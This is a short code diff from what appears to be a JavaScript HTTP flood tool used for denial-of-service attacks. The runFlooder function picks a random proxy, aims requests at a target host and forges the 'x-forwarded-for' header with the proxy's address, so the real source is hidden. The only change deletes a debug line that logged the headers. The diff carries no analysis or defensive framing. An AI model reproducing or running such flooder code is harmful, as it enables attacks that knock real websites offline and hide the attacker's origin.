@@ -266,7 +266,7 @@ headers["x-requested-with"] = "XMLHttpRequest";
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
-    console.log("headers: ", headers);
+
     headers[":authority"] = parsedTarget.host
     headers["x-forwarded-for"] = parsedProxy[0];
     headers["x-forwarded-proto"] = "https";
